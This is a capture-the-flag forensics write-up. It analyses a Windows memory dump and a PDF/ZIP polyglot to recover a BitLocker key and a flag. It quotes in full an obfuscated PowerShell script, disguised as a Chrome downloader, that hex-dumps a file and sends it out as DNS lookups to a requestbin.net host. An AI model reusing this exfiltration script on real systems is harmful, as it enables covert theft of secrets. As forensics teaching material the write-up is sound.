# Trust Issues

We have the memory dump of Mark's PC and a file ```confidential.pdf``` which was in his computer. We can either start with analysing the memory dump or the suspicious pdf.

## Analysing the memory dump

```bash
$ vol.py -f trustissues.raw imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/deathblade/ctf/DNS/trustissues.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800029f3130L
          Number of Processors : 4
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800029f5000L
                KPCR for CPU 1 : 0xfffff88002e40000L
                KPCR for CPU 2 : 0xfffff88002ebf000L
                KPCR for CPU 3 : 0xfffff88002f3e000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2020-12-26 10:59:24 UTC+0000
     Image local date and time : 2020-12-26 02:59:24 -0800
```

Now we have a profile.

Let us do another usual command:

```bash
vol.py -f trustissues.raw --profile=Win7SP1x64 filescan |grep Desktop
```

This should give a long list of files. In this we can find the directory ```Setup files given by sysadmin``` in which there are some setup scripts and installer files. We also notice a ```ChromeDownload.ps1``` which is odd cause why does downloading chrome need a powershell script?

So let us dump this powershell script and see what it contains:

```bash
vol.py -f trustissues.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007d845a10 -D .
cat file.None.0xfffffa8001d33ca0.dat
```

We find the following script:

```powershell
.("{0}{1}"-f 'ech','o'  ) 'Downloading Chrome......'

  & (  "{3}{4}{1}{0}{2}"-f 'eque','R','st','I','nvoke-Web' ) https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7B61A54C60-6972-227A-921D-DAD2B3C34001%7D%26lang%3Den%26browser%3D5%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DONGR%26installdataindex%3Ddefaultbrowser/update2/installers/ChromeSetup.exe -OutFile ChromeSetup.exe

${D`UMp}    =     & ( "{1}{0}{2}"-f 't-','Forma','Hex') -Path 'D:\Bitlo*'
${d`NS}   =    '.7965708720dcbe1fbd5b.d.requestbin.net'

for( ${i}     =     0  ;    ${D`UmP}[${I}];    ${I}++ )
{
    ${h`eX}    =  ${d`UMp}[${i}].ToString(   )
    ${h`EX}   = ${H`Ex}.replace(  ' ','' )
    if( ${I} -lt (${du`MP}.length - 1) )
    {
         ${H`eX}   =   ${h`eX}.Substring(   8,32  )
    }
    else
    {
        ${l`En`GTH}  =     (   (  ${H`ex}.length - 8  )*2  )/3
        ${H`eX}   =   ${h`eX}.Substring(   8,${l`EngtH}  )
    }
      . (  "{1}{2}{0}" -f 'up','nslo','ok') ( ${H`eX}     + ${d`Ns}  ) *>${N`ULl}
}

.("{1}{0}"-f'cho','e'  ) 'Downloaded Chrome'
```

We see an obfuscated script which does hella lot more than just download chrome. On deobfuscating it, we can see that it is converting a file at ```D:\Bitlo*``` into a hexdump and sending it as DNS requests using ```nslookup``` command part by part. This is some sort of a (n00bish) DNS exfiltration attack, performed by the sysadmin who gave these files. (You could have also easily been tipped off by the ```nslookup.exe``` processes in pslist or pstree)

We are also not able to dump nor scan the files in ```D:\```. One way to get the files would be to carve the packets out of the memory dump. You can either use caploader in Windows or you could find third party plugins for volatility such as the one used [here](https://github.com/Memoryforensics/carve_packets).

```bash
vol.py --plugins=carve_packets -f trustissues.raw --profile=Win7SP1x64 networkpackets -D .
```

The packets are dumped at ```packets.pcap```.

Let us use tshark to filter out the hex data as follows:

```bash
$ tshark -Y "dns.id == 2" -T fields -e "dns.qry.name"  -r packets.pcap | cut -d '.' -f1 |xxd -r -p
tLocker protected drive.

To verify that this is the correct recovery key compare the identification with what is presented on the recovery screen.

Recovery key identification: ABC7C7A1-9BEE-4F
Full recovery key identification: ABC7C7A1-9BEE-4F1C-90F7-5AB6D66CD465

BitLocker Recovery Key:
299981-297792-361471-261789-114642-633501-520685-433719

��BitLocker Drive Encryption Recovery Key

The recovery key is used to recover the data on a Bi
```

Thus, we have obtained a BitLocker recovery key (packets are disarranged here) which can be used to unlock a drive.

Another way to do this would be to dump the memory of powershell or the nslookup processes and search for relevant strings (bitlocker, requestbin, etc).

## Analysing the PDF

It is strange that a 5 page pdf has a size of roughly 81 MB. Let us see what is in this:

```bash
$ binwalk confidential.pdf 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
42            0x2A            Zip archive data, at least v2.0 to extract, compressed size: 939559, uncompressed size: 939559, name: confidential.pdf
939647        0xE567F         Zip archive data, at least v2.0 to extract, compressed size: 80507861, uncompressed size: 83886592, name: confidential.vhd
81447678      0x4DACAFE       End of Zip archive, footer length: 22

```

We got a ZIP PDF polyglot. On unzipping the PDF, we get the VHD file.

```bash
$ fdisk -l confidential.vhd
Disk confidential.vhd: 80 MiB, 83886592 bytes, 163841 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x6e388fd9

Device            Boot Start    End Sectors Size Id Type
confidential.vhd1        128 157823  157696  77M  7 HPFS/NTFS/exFAT
```

We have the mountable drive starting at offset ```$((512*128)) = 65536```.

```bash
$ dd if=confidential.vhd of=mountable.dd bs=65536 skip=1
1279+1 records in
1279+1 records out
83821056 bytes (84 MB, 80 MiB) copied, 0.128413 s, 653 MB/s

$ file mountable.dd
mountable.dd: DOS/MBR boot sector, code offset 0x58+2, OEM-ID "-FVE-FS-", sectors/cluster 8, reserved sectors 0, Media descriptor 0xf8, sectors/track 63, heads 255, hidden sectors 128, FAT (32 bit), sectors/FAT 8160, serial number 0x0, unlabeled; NTFS, sectors/track 63, physical drive 0x1fe0, $MFT start cluster 393217, serial number 02020454d414e204f, checksum 0x41462020
```

This is a BitLocker encrypted drive as indicated by the ```-FVE-FS-``` header. Mounting this will require ```libbde-utils```.

## Getting the flag

```bash
$ mkdir mountpoint

$ bdemount -r 299981-297792-361471-261789-114642-633501-520685-433719 mountable.dd mountpoint/

$ cp mountpoint/bde1 .

$ mkdir new_mountpoint

$ mount bde1 new_mountpoint

$ ls new_mountpoint/
'System Volume Information'  'Technical Business Document.docx'   flag.txt

$ cat new_mountpoint/flag.txt
p_ctf{1_wi$h_y0u_DNSee_th3_kEy}
```
